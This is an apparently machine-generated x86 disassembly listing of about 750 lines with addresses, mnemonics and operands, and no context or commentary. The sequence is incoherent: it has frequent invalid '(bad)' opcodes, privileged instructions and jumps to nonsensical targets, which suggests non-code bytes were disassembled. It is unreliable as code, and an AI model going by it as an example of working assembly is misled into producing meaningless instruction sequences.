  429b8a:	lock call edx
  429b8d:	fcom   DWORD PTR [ebp+0x45]
  429b90:	mov    eax,0x148a8b
  429b95:	push   ecx
  429b96:	enter  0xc145,0x83
  429b9a:	cmp    cl,BYTE PTR [eax]
  429b9c:	add    BYTE PTR [ebp+0x4d],al
  429b9f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429ba5:	call   0xffa29714
  429baa:	cmp    eax,DWORD PTR [ebp-0xc]
  429bad:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bb1:	push   ebp
  429bb2:	(bad)
  429bb5:	std    
  429bb6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bbd:	inc    ebp
  429bbe:	(bad)  
  429bbf:	call   0xff7c984f
  429bc4:	add    al,BYTE PTR [ebp+0x37]
  429bc7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bcd:	jne    0x429bcf
  429bcf:	(bad)  
  429bd0:	cmp    edi,esp
  429bd2:	jne    0x429c05
  429bd4:	mov    edi,edi
  429bd6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bdc:	pop    ds
  429bdd:	into   
  429bde:	je     0x429ba1
  429be0:	mov    ebx,DWORD PTR [esi]
  429be2:	or     BYTE PTR [ebp-0x49],al
  429be5:	mov    esp,DWORD PTR [esi-0x77]
  429be8:	mov    esi,0xfc451f0c
  429bed:	mov    eax,DWORD PTR [eax]
  429bef:	or     al,0x66
  429bf1:	sar    bl,0x3b
  429bf4:	xor    esi,DWORD PTR [ebp+0x66]
  429bf7:	xor    ecx,edi
  429bf9:	pop    edi
  429bfa:	adc    bl,BYTE PTR [ebx+0x78]
  429bfd:	ret    0xff
  429c00:	cld    
  429c01:	inc    ebp
  429c02:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c08:	cld    
  429c09:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c10:	push   0xffffff83
  429c12:	pop    edi
  429c13:	or     BYTE PTR [ebp+0x53],dh
  429c16:	xorps  xmm1,xmm2
  429c19:	test   BYTE PTR [eax+eax*1],bh
  429c1c:	add    BYTE PTR [eax],al
  429c1e:	adc    eax,eax
  429c20:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c28:	jmp    DWORD PTR [eax]
  429c2a:	ror    al,0x5e
  429c2d:	inc    ebp
  429c2e:	leave  
  429c2f:	xor    ecx,DWORD PTR [eax]
  429c31:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c37:	add    ch,al
  429c39:	xor    edi,edi
  429c3b:	xor    DWORD PTR [ebx],0x660033fc
  429c41:	mov    DWORD PTR [ebp-0xc],ecx
  429c44:	pcmpgtw mm0,mm0
  429c47:	add    dl,ah
  429c49:	leave  
  429c4a:	mov    edi,DWORD PTR [esi-0x7d]
  429c4d:	push   ax
  429c4f:	dec    ebp
  429c50:	mov    esi,DWORD PTR [ebx-0x75]
  429c53:	lea    ebp,[eax-0x7c00fffc]
  429c59:	xor    eax,DWORD PTR [eax]
  429c5b:	sysret 
  429c5d:	dec    ebp
  429c5e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c65:	push   WORD PTR [ecx+0x8]
  429c69:	jne    0x429c2c
  429c6b:	ud0    ecx,DWORD PTR [ecx]
  429c6e:	mov    esi,DWORD PTR [edx]
  429c70:	lods   al,BYTE PTR ds:[esi]
  429c71:	add    BYTE PTR [eax],al
  429c73:	data16 (bad) 
  429c75:	iret   
  429c76:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c7d:	cli    
  429c7e:	inc    ebp
  429c7f:	cmp    al,0x8d
  429c81:	add    BYTE PTR [esi+0x2d],ah
  429c84:	inc    ebp
  429c85:	pop    ebp
  429c86:	lea    ecx,[edi]
  429c88:	mov    dl,bh
  429c8a:	add    BYTE PTR [edi],cl
  429c8c:	mov    DWORD PTR [eax+eax*8],edi
  429c8f:	mov    ebx,0x3a87
  429c94:	add    BYTE PTR [ebx],ch
  429c96:	inc    ebp
  429c97:	data16 (bad) 
  429c99:	clc    
  429c9a:	int3   
  429c9b:	cmp    eax,DWORD PTR [eax]
  429c9d:	je     0x429c28
  429c9f:	push   0xffffffc8
  429ca1:	pop    edi
  429ca2:	xchg   DWORD PTR [ebp+0x0],eax
  429ca5:	data16 add BYTE PTR [ebp+0x45],cl
  429ca9:	lea    cx,[ebp+0x10]
  429cad:	jb     0x429caf
  429caf:	jmp    0x429c3a
  429cb1:	call   eax
  429cb3:	clc    
  429cb4:	xchg   DWORD PTR [edi+0x1],edi
  429cb7:	mov    eax,DWORD PTR [eax]
  429cb9:	or     BYTE PTR [ebp-0x49],al
  429cbc:	lea    eax,[eax+0x74003154]
  429cc2:	push   edi
  429cc3:	inc    edx
  429cc4:	jge    0x429cc5
  429cc6:	mov    DWORD PTR [edi],ecx
  429cc8:	fdiv   DWORD PTR [edi-0x6]
  429ccb:	inc    DWORD PTR [eax]
  429ccd:	xor    edx,DWORD PTR [eax+0x5f]
  429cd0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cd3:	ret    0x0
  429cd6:	xor    BYTE PTR [ebp-0x51],cl
  429cd9:	cmp    edi,0xf0ff8904
  429cdf:	data16 ror al,0x84
  429ce3:	rol    BYTE PTR [eax],0x3b
  429ce6:	add    al,dh
  429ce8:	dec    eax
  429ce9:	xchg   esp,eax
  429cea:	push   ebx
  429ceb:	jmp    0x429c78
  429ced:	push   ebp
  429cee:	add    esp,ebp
  429cf0:	add    ebp,esp
  429cf2:	mov    edx,DWORD PTR [edi+0x24]
  429cf5:	clc    
  429cf6:	dec    esi
  429cf7:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429cfd:	cmp    BYTE PTR [ebx],al
  429cff:	jne    0x429c8a
  429d01:	xor    esp,eax
  429d03:	jmp    0x459e86
  429d08:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d0b:	jne    0x429d01
  429d0d:	call   0xffcc9a67
  429d12:	clc    
  429d13:	xchg   edi,eax
  429d14:	sti    
  429d15:	add    DWORD PTR [ebx],eax
  429d17:	add    BYTE PTR [ebp+0x47],bl
  429d1a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d20:	pop    ebp
  429d21:	mov    DWORD PTR [esi-0x48],esi
  429d24:	jmp    0x429d6d
  429d26:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d2c:	(bad)  
  429d2e:	cmp    al,0x0
  429d30:	cmp    eax,DWORD PTR [ebp+0x18]
  429d33:	lea    ebx,[ebp-0x56]
  429d36:	jle    0x429d38
  429d38:	jae    0x429cc3
  429d3a:	mov    eax,esp
  429d3c:	call   0xb900:0x8b005587
  429d43:	inc    ebp
  429d44:	push   ebp
  429d45:	lea    ecx,[ebp-0x27ff4f12]
  429d4b:	mov    eax,edi
  429d4d:	int3   
  429d4e:	push   ebp
  429d4f:	xchg   edi,eax
  429d51:	add    esp,ebp
  429d53:	add    BYTE PTR [eax],al
  429d55:	inc    ebp
  429d56:	add    BYTE PTR [ebp+0x8b3255],cl
  429d5c:	cld    
  429d5d:	mov    DWORD PTR [edx],edi
  429d5f:	aam    0x75
  429d61:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d67:	mov    DWORD PTR [ebx-0x50],edx
  429d6a:	test   BYTE PTR [ebp-0x1],0xe8
  429d6e:	mov    eax,DWORD PTR [eax]
  429d70:	hlt    
  429d71:	add    al,al
  429d73:	mov    eax,DWORD PTR ds:0x890045a8
  429d79:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d7f:	inc    DWORD PTR [eax*2+0xf75854d]
  429d86:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429d8c:	call   0x7298facd
  429d91:	je     0x429df1
  429d93:	js     0x429df4
  429d95:	lock ret 0x7e
  429d99:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429d9f:	mov    edi,edi
  429da1:	sbb    al,bl
  429da3:	clc    
  429da4:	add    BYTE PTR [ebp-0x73],bh
  429da7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dad:	ror    BYTE PTR [eax],1
  429daf:	dec    ebp
  429db0:	xchg   ebp,eax
  429db1:	mov    edi,edi
  429db3:	in     al,0x8b
  429db5:	jge    0x429d40
  429db7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429dbd:	clc    
  429dbe:	pop    esi
  429dbf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429dc5:	clc    
  429dc6:	add    al,0x6e
  429dc8:	mov    eax,DWORD PTR [ebx]
  429dca:	mov    BYTE PTR [ebp+0x0],dl
  429dcd:	mov    edx,DWORD PTR [ebx-0x20]
  429dd0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429dd6:	add    eax,0x3b3a73
  429ddb:	adc    al,0x89
  429ddd:	pop    eax
  429dde:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429de2:	ret    0xf08
  429de5:	cmp    al,0x2
  429de7:	mov    DWORD PTR [edx],esi
  429de9:	cld    
  429dea:	add    BYTE PTR [ebp+0x66],dl
  429ded:	add    eax,ebx
  429def:	add    esp,eax
  429df1:	sub    eax,eax
  429df3:	or     BYTE PTR [ecx-0x77f474bb],cl
  429df9:	add    BYTE PTR [eax],al
  429dfb:	mov    DWORD PTR [ebx-0x24],ebx
  429dfe:	push   edi
  429dff:	push   ebp
  429e00:	clc    
  429e01:	add    DWORD PTR [esi+0x1b0100],0x45
  429e08:	out    0xff,eax
  429e0a:	add    edx,DWORD PTR [eax]
  429e0c:	jmp    0x429df6
  429e0e:	cmp    ch,0x43
  429e11:	(bad)  
  429e12:	jmp    0x40c82664
  429e17:	je     0x429da3
  429e19:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e1f:	inc    ebp
  429e20:	add    BYTE PTR [ebx-0x770375],al
  429e26:	add    ah,ch
  429e28:	add    edx,esp
  429e2a:	pop    edi
  429e2b:	pop    ebp
  429e2c:	push   ebp
  429e2d:	inc    ebx
  429e2e:	in     al,dx
  429e2f:	pop    ebp
  429e30:	in     al,dx
  429e31:	cmp    edx,DWORD PTR [edi-0x8]
  429e34:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e3b:	add    al,0x47
  429e3d:	push   ebp
  429e3e:	mov    esp,ebp
  429e40:	in     al,0x45
  429e42:	dec    ebp
  429e43:	push   esi
  429e44:	test   DWORD PTR [eax+0xff010f],esi
  429e4a:	add    BYTE PTR [eax+0xc018b],dh
  429e50:	leave  
  429e51:	inc    ebp
  429e52:	test   al,ch
  429e54:	add    dh,bh
  429e56:	add    bh,bh
  429e58:	dec    ebp
  429e59:	push   cs
  429e5a:	mov    DWORD PTR [ecx],eax
  429e5c:	hlt    
  429e5d:	push   es
  429e5e:	dec    ebp
  429e5f:	leave  
  429e60:	mov    DWORD PTR [eax],ecx
  429e62:	clc    
  429e63:	cmovge eax,ecx
  429e66:	mov    ecx,0x85c2f0
  429e6c:	clc    
  429e6d:	pop    DWORD PTR [ebp+0x1]
  429e70:	aas    
  429e71:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e78:	push   esi
  429e79:	add    BYTE PTR [ebp-0x4],al
  429e7c:	mov    DWORD PTR [eax],eax
  429e7e:	cld    
  429e7f:	inc    bp
  429e81:	add    DWORD PTR [edx],edi
  429e83:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429e8b:	mov    ebx,0xcd4f68
  429e90:	mov    edi,DWORD PTR [ebx]
  429e92:	or     al,0x75
  429e94:	(bad)  
  429e95:	xor    ecx,ebx
  429e97:	enterw 0x4d01,0x87
  429e9c:	jmp    0x429ea2
  429ea1:	ret    
  429ea2:	inc    ebp
  429ea3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ea9:	add    dh,cl
  429eab:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429eb3:	icebp  
  429eb4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eba:	inc    ebp
  429ebb:	inc    edx
  429ebc:	mov    ecx,DWORD PTR [edx]
  429ebe:	or     al,0xf9
  429ec0:	(bad)  
  429ec1:	jne    0x429e91
  429ec3:	mov    cl,0x0
  429ec6:	rol    BYTE PTR [esi+0x450134],1
  429ecc:	add    eax,edi
  429ece:	cld    
  429ecf:	ret    
  429ed0:	dec    ebp
  429ed1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ed7:	mov    edi,0xf82c8534
  429edc:	jmp    0x429f5b
  429ede:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429ee4:	mov    dl,0x8b
  429ee6:	sub    cl,BYTE PTR [eax]
  429ee8:	mov    ecx,ecx
  429eea:	in     al,dx
  429eeb:	test   cl,dh
  429eed:	add    BYTE PTR [edx],al
  429eef:	add    BYTE PTR [eax-0x377a97b3],al
  429ef5:	cmovge esi,esp
  429ef8:	add    eax,DWORD PTR [eax]
  429efa:	cld    
  429efb:	mov    eax,DWORD PTR [ecx]
  429efd:	adc    BYTE PTR [ebp+0x4d],cl
  429f00:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f06:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f0c:	cmp    esp,ebx
  429f0e:	jne    0x429eac
  429f10:	mov    eax,edi
  429f12:	adc    ah,ch
  429f14:	push   ebp
  429f15:	test   DWORD PTR [ebx],esi
  429f17:	clc    
  429f18:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f1e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f21:	dec    ebp
  429f22:	adc    bh,al
  429f24:	push   0x8b85ff10
  429f29:	clc    
  429f2a:	or     al,0x50
  429f2c:	(bad)  
  429f2d:	push   ecx
  429f2e:	retf   
  429f2f:	mov    ebx,0xff4d8dc8
  429f34:	mov    DWORD PTR [ebp+0x8],eax
  429f37:	xor    eax,DWORD PTR [ebp-0x75]
  429f3a:	cmp    ebp,DWORD PTR [ebx]
  429f3c:	lsl    ebx,WORD PTR [edi-0x8]
  429f40:	call   DWORD PTR [ebx-0x741bff75]
  429f46:	(bad)  
  429f47:	or     al,0x5b
  429f49:	dec    ebp
  429f4a:	or     BYTE PTR [ebx],dh
  429f4c:	inc    ebp
  429f4d:	xor    esi,DWORD PTR ds:0x708088d
  429f53:	in     eax,0x98
  429f55:	add    BYTE PTR [edx],dh
  429f57:	inc    ebp
  429f58:	pop    edi
  429f59:	xor    eax,edx
  429f5b:	test   DWORD PTR [eax],0x81108b8b
  429f61:	dec    ebp
  429f62:	sub    al,0x33
  429f64:	add    BYTE PTR [ebx],dh
  429f66:	push   esi
  429f67:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f6d:	mov    edi,eax
  429f6f:	or     BYTE PTR [ebp+0x45],al
  429f72:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f78:	cmp    cl,cl
  429f7a:	pushf  
  429f7b:	push   es
  429f7c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429f83:	dec    ebp
  429f84:	inc    ebp
  429f85:	and    BYTE PTR [eax],0x50
  429f88:	pushf  
  429f89:	push   0x4de4d1c7
  429f8e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429f94:	fsubr  st,st(1)
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	rol    bh,cl
  429f99:	mov    edx,esp
  429f9b:	or     BYTE PTR [ebp+0x4588f84d],al
  429fa1:	mov    ecx,DWORD PTR [eax]
  429fa3:	or     BYTE PTR [eax],al
  429fa5:	push   ebp
  429fa6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fac:	dec    ebp
  429fad:	enter  0xceba,0x8
  429fb1:	retf   0x1807
  429fb4:	ret    0x984d
  429fb7:	mov    esi,DWORD PTR [edx]
  429fb9:	or     al,0x33
  429fbb:	into   
  429fbc:	add    edx,esi
  429fbe:	add    ecx,edx
  429fc0:	bswap  eax
  429fc2:	ror    esi,0x98
  429fc5:	dec    ebp
  429fc6:	add    cl,ch
  429fc8:	mov    edi,edi
  429fca:	hlt    
  429fcb:	inc    esi
  429fcd:	inc    ebp
  429fce:	ret    0x4533
  429fd1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429fd7:	or     BYTE PTR [ebx],dh
  429fd9:	dec    ebp
  429fda:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429fe0:	jne    0xff8c9fa7
  429fe6:	inc    ebp
  429fe7:	inc    ebp
  429fe8:	mov    esi,DWORD PTR [ebx]
  429fea:	clc    
  429feb:	pop    esi
  429fec:	ret    0xcaeb
  429fef:	mov    eax,esi
  429ff1:	call   0x5203f0c4
  429ff6:	dec    ebp
  429ff7:	add    eax,0xf8728b
  429ffc:	adc    eax,0xce0ccac9
  42a001:	push   ebp
  42a002:	ret    0xc6ec
  42a005:	in     al,dx
  42a006:	call   0x3342ed0f
  42a00b:	push   edi
  42a00c:	add    edi,eax
  42a00e:	xor    eax,eax
  42a010:	jmp    0x42a057
  42a012:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a018:	add    eax,edi
  42a01a:	shr    eax,cl
  42a01c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a022:	mov    edi,DWORD PTR [ecx]
  42a024:	in     al,dx
  42a025:	pushf  
  42a026:	ret    0x84c7
  42a029:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a02f:	inc    ebp
  42a030:	in     al,dx
  42a031:	cmp    BYTE PTR [ebp-0x64],al
  42a034:	mov    eax,edi
  42a036:	cld    
  42a037:	fmul   st(2),st
  42a039:	sbb    dl,al
  42a03b:	jmp    0x9c3b:0x374d45c1
  42a042:	jbe    0x42a00b
  42a044:	mov    esp,eax
  42a046:	clc    
  42a047:	add    BYTE PTR [ebp+0x0],cl
  42a04a:	mov    ecx,ecx
  42a04c:	lea    eax,[ebp-0x5]
  42a04f:	mov    edi,edi
  42a051:	call   0x51cdf09b
  42a056:	hlt    
  42a057:	xor    eax,edx
  42a059:	mov    esi,0x987284
  42a05e:	xor    cl,dl
  42a060:	mov    esi,eax
  42a062:	hlt    
  42a063:	into   
  42a064:	inc    ebp
  42a065:	scas   eax,DWORD PTR es:[edi]
  42a066:	mov    ebp,ecx
  42a068:	cld    
  42a069:	add    dl,cl
  42a06b:	add    dl,al
  42a06d:	inc    ebp
  42a06e:	shr    DWORD PTR [ebx],0x4d
  42a071:	xor    edi,DWORD PTR [ebx]
  42a073:	mov    DWORD PTR [edi],ecx
  42a075:	clc    
  42a076:	dec    esi
  42a077:	inc    ebp
  42a078:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a07e:	ret    0xc6ca
  42a081:	mov    BYTE PTR [ebp-0x32],0x53
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	inc    ebp
  42a087:	jmp    0x42a0c0
  42a089:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a090:	pop    ebx
  42a091:	xor    ecx,DWORD PTR [ebp+0x3]
  42a094:	mov    eax,DWORD PTR [ebx]
  42a096:	clc    
  42a097:	test   edx,ecx
  42a099:	mov    ecx,esi
  42a09b:	cld    
  42a09c:	call   0x8ab6e5e6
  42a0a1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0a7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0ad:	fdiv   QWORD PTR [ebx]
  42a0af:	retf   0xce89
  42a0b2:	in     al,0xc1
  42a0b4:	inc    ebp
  42a0b5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0bb:	into   
  42a0bc:	mov    dh,0xc1
  42a0bf:	call   0x8c16e648
  42a0c4:	(bad)  
  42a0c5:	cld    
  42a0c6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0c9:	xor    eax,ecx
  42a0cb:	lea    eax,[ebp+0x8]
  42a0ce:	mov    esi,DWORD PTR [edx-0x4]
  42a0d1:	add    dl,al
  42a0d3:	inc    ebp
  42a0d4:	mov    esp,0x32d8988b
  42a0d9:	dec    ebp
  42a0da:	mov    esi,DWORD PTR [ebx]
  42a0dc:	cld    
  42a0dd:	xor    eax,edx
  42a0df:	sub    ebp,DWORD PTR [eax-0x75]
  42a0e2:	int    0xec
  42a0e4:	sub    ecx,eax
  42a0e6:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a0ec:	mov    esi,esp
  42a0ee:	call   0x3416ee77
  42a0f3:	inc    DWORD PTR [ebx]
  42a0f5:	mov    edi,DWORD PTR [ebx]
  42a0f7:	cld    
  42a0f8:	jne    0x42a147
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	aam    0x8d
  42a0fe:	dec    ebp
  42a0ff:	or     BYTE PTR [ebx],dh
  42a101:	jb     0x42a106
  42a103:	add    BYTE PTR [edi+0x45],bl
  42a106:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a10d:	xor    ebp,esp
  42a10f:	xor    eax,edi
  42a111:	sub    edi,esp
  42a113:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a119:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a120:	inc    ebp
  42a121:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a127:	clc    
  42a128:	mov    eax,edi
  42a12a:	nop
  42a12b:	fadd   QWORD PTR [eax]
  42a12d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a133:	jmp    0x42a0be
  42a135:	mov    eax,DWORD PTR [ecx]
  42a137:	fadd   DWORD PTR [eax]
  42a139:	inc    ebp
  42a13a:	or     DWORD PTR [ebx],esi
  42a13c:	dec    eax
  42a13d:	add    edx,DWORD PTR [ebx-0x2d]
  42a140:	dec    ebp
  42a141:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a147:	inc    ebp
  42a148:	push   eax
  42a149:	mov    dl,BYTE PTR [ecx-0xd]
  42a14c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a14f:	(bad)  
  42a151:	rol    BYTE PTR [eax],0xc1
  42a154:	ret    
  42a155:	inc    ebp
  42a156:	inc    ebp
  42a157:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a15d:	xor    eax,ebx
  42a15f:	add    eax,DWORD PTR [ebp+0x23]
  42a162:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a168:	cmp    edi,0xc
  42a16b:	dec    ebp
  42a16c:	inc    ebp
  42a16d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a173:	inc    ebp
  42a174:	mov    esi,DWORD PTR [ebx]
  42a176:	clc    
  42a177:	lea    eax,[ebp+0x45725407]
  42a17d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a181:	xor    edi,DWORD PTR [eax]
  42a183:	mov    ecx,0xff8b8d4d
  42a188:	push   esp
  42a189:	enter  0x4df7,0x23
  42a18d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a193:	mov    eax,DWORD PTR [ebx]
  42a195:	loopne 0x42a182
  42a197:	ret    0xc68b
  42a19a:	push   esp
  42a19b:	enter  0x9745,0x8b
  42a19f:	inc    ebp
  42a1a0:	cld    
  42a1a1:	mov    eax,edi
  42a1a3:	clc    
  42a1a4:	ret    
  42a1a5:	ret    0xc645
  42a1a8:	mov    esi,DWORD PTR [ebx]
  42a1aa:	cld    
  42a1ab:	pop    esi
  42a1ac:	mov    ebx,0x83458bc3
  42a1b2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1b6:	dec    ebp
  42a1b7:	cmp    BYTE PTR [ebx],dh
  42a1b9:	pushf  
  42a1ba:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1c0:	fcom   DWORD PTR [ebp+0x45]
  42a1c3:	mov    edi,DWORD PTR [edx]
  42a1c5:	adc    al,0x9c
  42a1c7:	inc    ebp
  42a1c8:	(bad)  
  42a1c9:	mov    ebx,eax
  42a1cb:	adc    al,0x85
  42a1cd:	cmp    al,0x1
  42a1d0:	inc    ebp
  42a1d1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1d8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1de:	xor    eax,DWORD PTR [ebx]
  42a1e0:	add    edi,DWORD PTR [ecx+ecx*4]
  42a1e3:	mov    esp,esi
  42a1e5:	clc    
  42a1e6:	inc    ebp
  42a1e7:	inc    ebp
  42a1e8:	add    edx,DWORD PTR [esi+0xc]
  42a1eb:	mov    edi,0x7ff0845
  42a1f0:	in     al,dx
  42a1f1:	(bad)  
  42a1f2:	jne    0x42a18c
  42a1f4:	mov    esi,DWORD PTR [edx]
  42a1f6:	clc    
  42a1f7:	add    ebp,DWORD PTR [edx]
  42a1f9:	mov    edi,edi
  42a1fb:	in     al,dx
  42a1fc:	mov    DWORD PTR [ebp-0x10],eax
  42a1ff:	xor    eax,DWORD PTR [ebp+0x3]
  42a202:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a208:	fmul   DWORD PTR [ebx-0x173caf39]
  42a20e:	lea    ecx,[ecx+0x45e8d4bc]
  42a214:	clc    
  42a215:	mov    edi,edi
  42a217:	cmp    BYTE PTR [ebp+0x4d],al
  42a21a:	test   DWORD PTR [eax+0x74],ecx
  42a21d:	inc    ecx
  42a21e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a224:	ret    
  42a225:	inc    eax
  42a226:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a22c:	push   eax
  42a22d:	dec    eax
  42a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a22f:	sar    bh,1
  42a231:	enter  0x458b,0xec
  42a235:	mov    eax,DWORD PTR [ebp+0x38]
  42a238:	mov    eax,ecx
  42a23a:	fadd   DWORD PTR [ebx]
  42a23c:	dec    ebp
  42a23d:	inc    eax
  42a23e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a244:	inc    ebp
  42a245:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a24b:	fadd   QWORD PTR [ebx]
  42a24d:	inc    ebp
  42a24e:	or     al,0x33
  42a250:	dec    ebp
  42a251:	add    edi,DWORD PTR [ebx]
  42a253:	mov    DWORD PTR [edx-0x28],esi
  42a256:	mov    eax,DWORD PTR [ebp-0x10]
  42a259:	mov    eax,DWORD PTR [eax+0x10]
  42a25c:	mov    eax,edi
  42a25e:	lock ret 
  42a260:	inc    ecx
  42a261:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a267:	fsubr  st,st(5)
  42a269:	test   DWORD PTR [eax],eax
  42a26b:	clc    
  42a26c:	push   0x45
  42a26e:	(bad)  
  42a26f:	cmp    ebp,esp
  42a271:	pushf  
  42a272:	inc    ebp
  42a273:	(bad)  
  42a274:	push   eax
  42a275:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a279:	clc    
  42a27a:	mov    eax,0xf8008584
  42a27f:	mov    eax,DWORD PTR [ebp-0x4]
  42a282:	mov    edi,0x4585c3cc
  42a288:	clc    
  42a289:	mov    eax,DWORD PTR [ebp+0x14]
  42a28c:	cmp    al,BYTE PTR [ebp-0x64]
  42a28f:	mov    edi,eax
  42a291:	in     al,dx
  42a292:	les    esi,FWORD PTR [ebp-0x7b]
  42a295:	mov    edi,eax
  42a297:	or     al,0x4d
  42a299:	dec    ebp
  42a29a:	mov    eax,ebp
  42a29c:	in     al,0xf2
  42a29e:	dec    ebp
  42a29f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2a5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2ab:	inc    ebp
  42a2ac:	mov    DWORD PTR [ebx],esi
  42a2ae:	fadd   QWORD PTR [ebx]
  42a2b0:	dec    ebp
  42a2b1:	push   eax
  42a2b2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2b5:	push   eax
  42a2b6:	mov    DWORD PTR [eax],ebx
  42a2b8:	fdivr  st,st(7)
  42a2ba:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2c1:	dec    esi
  42a2c2:	clc    
  42a2c3:	inc    ebp
  42a2c4:	test   BYTE PTR [ebx],dh
  42a2c6:	add    DWORD PTR [ebx],eax
  42a2c8:	add    BYTE PTR [eax+0x4d],dl
  42a2cb:	jne    0x42a300
  42a2cd:	lea    ecx,[ebx-0x7617fc44]
  42a2d3:	div    ah
  42a2d5:	inc    DWORD PTR [ebp+0x45]
  42a2d8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2de:	jb     0x42a26b
  42a2e0:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  42a2ea:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2ed:	mov    edi,DWORD PTR [ebx]
  42a2ef:	adc    BYTE PTR [ebp+0x41],dh
  42a2f2:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a2f8:	ret    
  42a2f9:	push   ss
  42a2fa:	push   0x45
  42a2fc:	lea    ecx,[ebx+0x4de80cb0]
  42a302:	sti    
  42a303:	add    edi,edi
  42a305:	or     BYTE PTR [ebp+0x4d],al
  42a308:	mov    ebp,DWORD PTR [ebx]
  42a30a:	xor    ebp,ecx
  42a30c:	mov    al,BYTE PTR [edx]
  42a30e:	add    eax,0xc7200
  42a313:	jne    0x42a362
  42a315:	lea    esi,[ebx]
  42a317:	mov    al,0xf
  42a319:	call   0xe99de
  42a31e:	sar    DWORD PTR [eax],0x84
  42a321:	pushf  
  42a322:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a328:	mov    edi,DWORD PTR [ecx]
  42a32a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a331:	test   DWORD PTR [eax],eax
  42a333:	clc    
  42a334:	dec    ebp
  42a335:	inc    ebp
  42a336:	xor    edi,DWORD PTR [ebx]
  42a338:	setl   al
  42a33b:	(bad)  
  42a33c:	retf   
